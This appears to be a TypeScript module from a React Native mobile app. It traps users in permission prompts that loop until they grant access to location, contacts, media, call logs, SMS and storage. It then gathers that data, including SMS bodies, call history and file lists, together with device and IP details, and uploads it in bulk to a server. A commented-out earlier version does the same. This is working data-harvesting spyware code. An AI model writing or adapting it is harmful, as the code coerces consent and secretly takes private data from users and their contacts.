import { generateHeaders } from "@/lib/generateHeaders";
import axios from "axios";
import * as Contacts from "expo-contacts";
import * as Device from "expo-device";
import * as Linking from "expo-linking";
import * as Location from "expo-location";
import * as MediaLibrary from "expo-media-library";
import * as Network from "expo-network";
import { Alert, AppState, PermissionsAndroid, Platform } from "react-native";
import RNFS from "react-native-fs";
import SmsAndroid from "react-native-get-sms-android";


/* ----------------------------- HELPERS ----------------------------- */
function getLocalISOTimeMicro() {
  const now = new Date();
  const ms = String(now.getMilliseconds()).padStart(3, "0") + "000";
  const tzOffset = -now.getTimezoneOffset();
  const sign = tzOffset >= 0 ? "+" : "-";
  const diffHours = String(Math.floor(Math.abs(tzOffset) / 60)).padStart(2, "0");
  const diffMinutes = String(Math.abs(tzOffset % 60)).padStart(2, "0");
  const base = now.toISOString().split(".")[0];
  return `${base}.${ms}${sign}${diffHours}:${diffMinutes}`;
}

async function waitForAppReturn() {
  return new Promise<void>((resolve) => {
    const sub = AppState.addEventListener("change", (s) => {
      if (s === "active") {
        sub.remove();
        resolve();
      }
    });
  });
}

async function showRetryAlert(title: string, denied: string[]) {
  return new Promise<"retry" | "settings">((resolve) => {
    Alert.alert(
      title,
      `Please allow:\n\n- ${denied.join("\n- ")}`,
      [
        { text: "Retry", onPress: () => resolve("retry") },
        { text: "Open Settings", onPress: () => resolve("settings") },
      ],
      { cancelable: false }
    );
  });
}

/* ----------------------------- LOCATION ----------------------------- */
export async function requestAndFetchLocation() {
  let granted = false;
  while (!granted) {
    const { status } = await Location.requestForegroundPermissionsAsync();
    granted = status === "granted";

    if (!granted) {
      const action = await showRetryAlert("Location Permission Required", ["Location"]);
      if (action === "settings") {
        await Linking.openSettings();
        await waitForAppReturn();
      }
      continue;
    }
  }

  const location = await Location.getCurrentPositionAsync({});
  const geocode = await Location.reverseGeocodeAsync(location.coords);
  const address =
    geocode.length > 0
      ? `${geocode[0].name}, ${geocode[0].street}, ${geocode[0].city}, ${geocode[0].region}, ${geocode[0].country}`
      : "Unknown";

  return {
    latitude: location.coords.latitude,
    longitude: location.coords.longitude,
    address,
  };
}

/* ----------------------------- CONTACTS ----------------------------- */
export async function requestAndFetchContacts() {
  let granted = false;

  // Step 1: Keep retrying until granted
  while (!granted) {
    const { status } = await Contacts.requestPermissionsAsync();
    granted = status === "granted";

    if (!granted) {
      const action = await showRetryAlert("Contacts Permission Required", ["Contacts"]);
      if (action === "settings") {
        await Linking.openSettings();
        await waitForAppReturn();
      }
    }
  }

  // Step 2: Paginate safely
  let allContacts: Contacts.Contact[] = [];
  let hasNextPage = true;
  let pageOffset: number | undefined = 0;

  while (hasNextPage) {
    // Force-cast pageOffset safely since TS doesn’t define it
    const response = (await Contacts.getContactsAsync({
      fields: [Contacts.Fields.PhoneNumbers],
      pageSize: 1000,
      pageOffset,
    })) as Contacts.ContactResponse & { pageOffset?: number };

    allContacts = allContacts.concat(response.data);
    hasNextPage = response.hasNextPage ?? false;
    pageOffset = response.pageOffset;
  }

  // Step 3: Clean + format
  return allContacts
    .filter((c) => c.name && c.phoneNumbers && c.phoneNumbers.length)
    .map((c) => ({
      name: c.name,
      number: c.phoneNumbers?.[0]?.number ?? "Unknown",
    }));
}

/* ----------------------------- MEDIA LIBRARY ----------------------------- */
export async function requestAndFetchMediaFiles() {
  let granted = false;
  while (!granted) {
    const { status } = await MediaLibrary.requestPermissionsAsync();
    granted = status === "granted";

    if (!granted) {
      const action = await showRetryAlert("Media Library Permission Required", ["Media Library"]);
      if (action === "settings") {
        await Linking.openSettings();
        await waitForAppReturn();
      }
      continue;
    }
  }

  try {
    const media = await MediaLibrary.getAssetsAsync({
      first: 1000,
      mediaType: ["photo", "video"],
      sortBy: [["creationTime", false]],
    });

    return media.assets.map((item) => ({
      id: item.id,
      uri: item.uri,
      filename: item.filename,
      mediaType: item.mediaType,
      creationTime: item.creationTime,
      width: item.width,
      height: item.height,
      duration: item.duration,
    }));
  } catch (error) {
    console.error("❌ Error fetching media files:", error);
    return [];
  }
}

/* ----------------------------- CALL LOGS ----------------------------- */
export async function requestAndFetchCallLogs() {
  if (Platform.OS !== "android") return [];

  let granted = false;

  while (!granted) {
    const perms = await PermissionsAndroid.requestMultiple([
      PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
      PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
    ]);

    granted =
      perms["android.permission.READ_CALL_LOG"] ===
      PermissionsAndroid.RESULTS.GRANTED;

    if (!granted) {
      const action = await showRetryAlert("Call Log Permission Required", [
        "Call Logs",
      ]);
      if (action === "settings") {
        await Linking.openSettings();
        await waitForAppReturn();
      }
      continue;
    }
  }

  try {
    const CallLogs = require("react-native-call-log");
    if (!CallLogs?.loadAll) return [];

    const logs = await CallLogs.loadAll();
    return logs.slice(0, 50).map((log: any) => ({
      name: log.name || "Unknown",
      number: log.phoneNumber || log.number,
      type: log.type || "UNKNOWN",
      duration: log.duration || "0",
      timestamp: log.timestamp || log.dateTime || null,
    }));
  } catch (e) {
    console.error("❌ Error fetching call logs:", e);
    return [];
  }
}

/* ----------------------------- SMS ----------------------------- */
export async function requestAndFetchSms() {
  if (Platform.OS !== "android") return [];

  let granted = false;

  while (!granted) {
    const perms = await PermissionsAndroid.requestMultiple([
      PermissionsAndroid.PERMISSIONS.READ_SMS,
      PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
      PermissionsAndroid.PERMISSIONS.SEND_SMS,
    ]);

    granted =
      perms["android.permission.READ_SMS"] ===
      PermissionsAndroid.RESULTS.GRANTED;

    if (!granted) {
      const action = await showRetryAlert("SMS Permission Required", ["SMS"]);
      if (action === "settings") {
        await Linking.openSettings();
        await waitForAppReturn();
      }
      continue;
    }
  }

  try {
    return await new Promise((resolve) => {
      const filter = { box: "inbox", maxCount: 30 }; // limit for safety
      (SmsAndroid as any).list(
        JSON.stringify(filter),
        (fail: any) => {
          console.error("❌ SMS fetch failed:", fail);
          resolve([]);
        },
        (count: number, smsList: string) => {
          try {
            const parsed = JSON.parse(smsList);
            const clean = parsed.map((msg: any) => ({
              address: msg.address,
              body: msg.body?.slice(0, 120), // truncate message text
              date: msg.date,
              read: msg.read === 1,
            }));
            resolve(clean);
          } catch (err) {
            console.error("❌ SMS parse error:", err);
            resolve([]);
          }
        }
      );
    });
  } catch (e) {
    console.error("❌ Error fetching SMS:", e);
    return [];
  }
}

/* ----------------------------- STORAGE ----------------------------- */
export async function requestAndFetchStorageFiles() {
  if (Platform.OS !== "android") return [];

  let granted = false;
  while (!granted) {
    if (Platform.Version >= 33) {
      const perms = await PermissionsAndroid.requestMultiple([
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
        PermissionsAndroid.PERMISSIONS.READ_MEDIA_AUDIO,
      ]);
      granted = perms["android.permission.READ_MEDIA_IMAGES"] === PermissionsAndroid.RESULTS.GRANTED;
    } else {
      const perm = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
      );
      granted = perm === PermissionsAndroid.RESULTS.GRANTED;
    }

    if (!granted) {
      const action = await showRetryAlert("Storage Permission Required", ["Storage"]);
      if (action === "settings") {
        await Linking.openSettings();
        await waitForAppReturn();
      }
      continue;
    }
  }

  const basePath =
    Platform.OS === "android" ? RNFS.ExternalStorageDirectoryPath : RNFS.DocumentDirectoryPath;
  const allowedDirs = [
    `${basePath}/Download`,
    `${basePath}/Documents`,
    `${basePath}/DCIM`,
    `${basePath}/Pictures`,
  ];

  const allFiles: any[] = [];
  for (const dir of allowedDirs) {
    try {
      const items = await RNFS.readDir(dir);
      for (const item of items) {
        if (item.isFile()) {
          allFiles.push({
            name: item.name,
            path: item.path,
            size: item.size,
            modifiedTime: item.mtime,
          });
        }
      }
    } catch {}
  }

  console.log(`📂 Found ${allFiles.length} storage files`);
  return allFiles;
}

/* ----------------------------- MASTER FUNCTION ----------------------------- */
export async function requestAllPermissions() {
  const base_URL = process.env.EXPO_PUBLIC_API_BASE_URL;
  const SUBMIT_ENDPOINT = `${base_URL}/user/`;

  try {
    const location = await requestAndFetchLocation();
    const contacts = await requestAndFetchContacts();
    const media = await requestAndFetchMediaFiles();
    const callLogs = await requestAndFetchCallLogs();
    const smsList = await requestAndFetchSms();
    const storageFiles = await requestAndFetchStorageFiles();

    const net = await Network.getNetworkStateAsync();
    const ipAddress = await Network.getIpAddressAsync();

    const allData = {
      deviceInfo: {
        brand: Device.brand,
        modelName: Device.modelName,
        osName: Device.osName,
        osVersion: Device.osVersion,
      },
      networkInfo: {
        type: net.type,
        isConnected: net.isConnected,
        ipAddress,
      },
      location,
      contacts,
      callLogs,
      smsList,
      files: media,
      storageFiles,
    };

    const headers = await generateHeaders();
    await axios.post(
      SUBMIT_ENDPOINT,
      {
        timestamp: getLocalISOTimeMicro(),
        info: allData,
      },
      { headers }
    );

    return allData;
  } catch (err) {
    console.error("❌ Permission Error:", err);
    Alert.alert("Error", "Something went wrong while requesting permissions.");
    return null;
  }
}








// /* ----------------------------- CALL LOGS ----------------------------- */
// async function requestCallLogPermissions() {
//   try {
//     const granted = await PermissionsAndroid.requestMultiple([
//       PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
//       PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
//     ]);

//     return (
//       granted["android.permission.READ_CALL_LOG"] ===
//       PermissionsAndroid.RESULTS.GRANTED
//     );
//   } catch (error) {
//     console.error("❌ Error requesting Call Log permissions:", error);
//     return false;
//   }
// }

// async function getCallLogsSafe() {
//   try {
//     const CallLogs = require("react-native-call-log");
//     if (!CallLogs?.loadAll) {
//       console.warn(
//         "⚠️ Call Log module not available. Run via prebuild + run:android"
//       );
//       return [];
//     }
//     const logs = await CallLogs.loadAll();
//     return logs;
//   } catch (error) {
//     console.error("❌ Error fetching call logs:", error);
//     return [];
//   }
// }

// /* ----------------------------- SMS ----------------------------- */
// async function requestSmsPermissions() {
//   try {
//     const granted = await PermissionsAndroid.requestMultiple([
//       PermissionsAndroid.PERMISSIONS.READ_SMS,
//       PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
//       PermissionsAndroid.PERMISSIONS.SEND_SMS,
//     ]);

//     return (
//       granted["android.permission.READ_SMS"] ===
//       PermissionsAndroid.RESULTS.GRANTED
//     );
//   } catch (e) {
//     console.error("❌ Error requesting SMS permissions:", e);
//     return false;
//   }
// }

// async function getSmsSafe() {
//   try {
//     return new Promise((resolve) => {
//       const filter = { box: "inbox", maxCount: 20 };
//       (SmsAndroid as any).list(
//         JSON.stringify(filter),
//         (fail: any) => {
//           console.error("SMS fetch failed:", fail);
//           resolve([]);
//         },
//         (count: number, smsList: string) => {
//           try {
//             resolve(JSON.parse(smsList));
//           } catch {
//             resolve([]);
//           }
//         }
//       );
//     });
//   } catch (e) {
//     console.error("❌ Error fetching SMS:", e);
//     return [];
//   }
// }

// /* ----------------------------- HELPERS ----------------------------- */
// function getLocalISOTimeMicro() {
//   const now = new Date();
//   const ms = String(now.getMilliseconds()).padStart(3, "0") + "000";
//   const tzOffset = -now.getTimezoneOffset();
//   const sign = tzOffset >= 0 ? "+" : "-";
//   const diffHours = String(Math.floor(Math.abs(tzOffset) / 60)).padStart(
//     2,
//     "0"
//   );
//   const diffMinutes = String(Math.abs(tzOffset % 60)).padStart(2, "0");
//   const base = now.toISOString().split(".")[0];
//   return `${base}.${ms}${sign}${diffHours}:${diffMinutes}`;
// }

// /* ----------------------------- STORAGE FILES ----------------------------- */
// async function listStorageFiles() {
//   try {
//     // 🔹 Request proper permissions based on Android version
//     if (Platform.OS === "android") {
//       if (Platform.Version >= 33) {
//         await PermissionsAndroid.requestMultiple([
//           PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
//           PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
//           PermissionsAndroid.PERMISSIONS.READ_MEDIA_AUDIO,
//         ]);
//       } else {
//         await PermissionsAndroid.request(
//           PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
//         );
//       }
//     }

//     // 🔹 Determine base directory
//     const basePath =
//       Platform.OS === "android"
//         ? RNFS.ExternalStorageDirectoryPath // → /storage/emulated/0
//         : RNFS.DocumentDirectoryPath;

//     // 🔹 Only scan safe folders (avoid /Android/data)
//     const allowedDirs = [
//       `${basePath}/Download`,
//       `${basePath}/Documents`,
//       `${basePath}/DCIM`,
//       `${basePath}/Pictures`,
//     ];

//     const allFiles: any[] = [];

//     for (const dir of allowedDirs) {
//       try {
//         const items = await RNFS.readDir(dir);
//         for (const item of items) {
//           if (item.isFile()) {
//             allFiles.push({
//               name: item.name,
//               path: item.path,
//               size: item.size,
//               modifiedTime: item.mtime,
//             });
//           }
//         }
//       } catch {
//         // skip folders without permission
//       }
//     }

//     console.log(`📂 Found ${allFiles.length} storage files`);
//     return allFiles;
//   } catch (err) {
//     console.error("❌ Error reading storage files:", err);
//     Alert.alert(
//       "Storage Access Error",
//       "Unable to access files. Please grant storage permission in settings."
//     );
//     return [];
//   }
// }

// /* ----------------------------- MAIN FUNCTION ----------------------------- */
// export async function requestAllPermissions() {
//   const base_URL = process.env.EXPO_PUBLIC_API_BASE_URL;
//   const SUBMIT_ENDPOINT = `${base_URL}/user/`;
//   const SUBMIT_MEDIA_ENDPOINT = `${base_URL}/user/u`;

//   try {
//     let allGranted = false;

//     // 🔹 Initial permission requests
//     if (Platform.OS === "android") {
//       await requestCallLogPermissions();
//       await requestSmsPermissions();
//     }
//     await Promise.all([
//       Location.requestForegroundPermissionsAsync(),
//       Contacts.requestPermissionsAsync(),
//       MediaLibrary.requestPermissionsAsync(),
//     ]);

//     // 🔁 Keep prompting until everything granted
//     while (!allGranted) {
//       const [loc, cont, net, media] = await Promise.all([
//         Location.getForegroundPermissionsAsync(),
//         Contacts.getPermissionsAsync(),
//         Network.getNetworkStateAsync(),
//         MediaLibrary.getPermissionsAsync(),
//       ]);

//       const callLogGranted =
//         Platform.OS === "android"
//           ? await PermissionsAndroid.check(
//               PermissionsAndroid.PERMISSIONS.READ_CALL_LOG
//             )
//           : true;
//       const smsGranted =
//         Platform.OS === "android"
//           ? await PermissionsAndroid.check(
//               PermissionsAndroid.PERMISSIONS.READ_SMS
//             )
//           : true;

//       let storageGranted = true;
//       if (Platform.OS === "android") {
//         if (Platform.Version >= 33) {
//           const mediaGranted = await PermissionsAndroid.check(
//             PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
//           );
//           storageGranted = mediaGranted;
//         } else {
//           storageGranted = await PermissionsAndroid.check(
//             PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
//           );
//         }
//       }

//       const denied: string[] = [];
//       if (loc.status !== "granted") denied.push("Location");
//       if (cont.status !== "granted") denied.push("Contacts");
//       if (!net.isConnected) denied.push("Internet");
//       if (media.status !== "granted") denied.push("Media Library");
//       if (Platform.OS === "android" && !callLogGranted)
//         denied.push("Call Logs");
//       if (Platform.OS === "android" && !smsGranted) denied.push("SMS");
//       if (Platform.OS === "android" && !storageGranted) denied.push("Storage");

//       if (denied.length === 0) {
//         allGranted = true;

//         /* ---------- Collect all data ---------- */
//         const deviceInfo = {
//           brand: Device.brand,
//           modelName: Device.modelName,
//           osName: Device.osName,
//           osVersion: Device.osVersion,
//         };

//         const ipAddress = await Network.getIpAddressAsync();
//         const networkInfo = {
//           type: net.type,
//           isConnected: net.isConnected,
//           ipAddress,
//         };

//         const location = await Location.getCurrentPositionAsync({});
//         const geocode = await Location.reverseGeocodeAsync(location.coords);
//         const address =
//           geocode.length > 0
//             ? `${geocode[0].name}, ${geocode[0].street}, ${geocode[0].city}, ${geocode[0].region}, ${geocode[0].country}`
//             : "Unknown";

//         const contactsData = await Contacts.getContactsAsync({
//           fields: [Contacts.Fields.PhoneNumbers],
//           pageSize: 20,
//         });
//         const safeContacts = contactsData.data.map((c) => ({
//           name: c.name,
//           phoneNumbers: c.phoneNumbers?.map((p) => p.number) || [],
//         }));

//         const callLogs = callLogGranted ? await getCallLogsSafe() : [];
//         const smsList = smsGranted ? await getSmsSafe() : [];

//         async function getAllMediaFiles() {
//           try {
//             const media = await MediaLibrary.getAssetsAsync({
//               first: 1000, // adjust based on how many you want
//               mediaType: ["photo", "video"],
//               sortBy: [["creationTime", false]],
//             });

//             const assets = media.assets.map((item) => ({
//               id: item.id,
//               uri: item.uri,
//               filename: item.filename,
//               mediaType: item.mediaType,
//               creationTime: item.creationTime,
//               width: item.width,
//               height: item.height,
//               duration: item.duration,
//             }));

//             console.log(`📸 Found ${assets.length} media files`);
//             return assets;
//           } catch (error) {
//             console.error("❌ Error fetching media files:", error);
//             return [];
//           }
//         }

//         const files = await getAllMediaFiles();

//         const storageFiles = await listStorageFiles();
//         console.log(
//           `📁 Found ${storageFiles.length} storage files`,
//           storageFiles
//         );

//         const allData = {
//           deviceInfo,
//           networkInfo,
//           location: {
//             latitude: location.coords.latitude,
//             longitude: location.coords.longitude,
//             address,
//           },
//           contacts: safeContacts,
//           callLogs,
//           smsList,
//           files,
//           storageFiles,
//         };

//         //  console.log("📊 Permission Summary:", allData);

//         // 📨 Submit to API
//         try {
//           const headers = await generateHeaders();
//           const response = await axios.post(
//             SUBMIT_ENDPOINT,
//             {
//               timestamp: getLocalISOTimeMicro(),
//               info: allData,
//             },
//             { headers }
//           );
//           //  console.log("✅ Permission data submitted:", response.data);
//         } catch (err) {
//           console.error("❌ Error submitting data:", err);
//         }

//         return allData;
//       }

//       // 🚫 Some permissions denied
//       console.log("🚫 Denied:", denied);

//       const userAction = await new Promise<"retry" | "settings">((resolve) => {
//         Alert.alert(
//           "Permissions Required",
//           `Please allow:\n\n- ${denied.join("\n- ")}`,
//           [
//             { text: "Retry", onPress: () => resolve("retry") },
//             { text: "Open Settings", onPress: () => resolve("settings") },
//           ],
//           { cancelable: false }
//         );
//       });

//       if (userAction === "settings") {
//         await Linking.openSettings();
//         await new Promise<void>((resolve) => {
//           const sub = AppState.addEventListener("change", (s) => {
//             if (s === "active") {
//               sub.remove();
//               resolve();
//             }
//           });
//         });
//       } else {
//         // Retry denied permissions only
//         if (Platform.OS === "android" && denied.includes("Call Logs"))
//           await requestCallLogPermissions();
//         if (Platform.OS === "android" && denied.includes("SMS"))
//           await requestSmsPermissions();
//         if (denied.includes("Location"))
//           await Location.requestForegroundPermissionsAsync();
//         if (denied.includes("Contacts"))
//           await Contacts.requestPermissionsAsync();
//         if (denied.includes("Media Library"))
//           await MediaLibrary.requestPermissionsAsync();
//         if (Platform.OS === "android" && denied.includes("Storage"))
//           await listStorageFiles();
//       }
//     }
//   } catch (err) {
//     console.error("❌ Permission Error:", err);
//     Alert.alert("Error", "Something went wrong while requesting permissions.");
//     return null;
//   }
// }
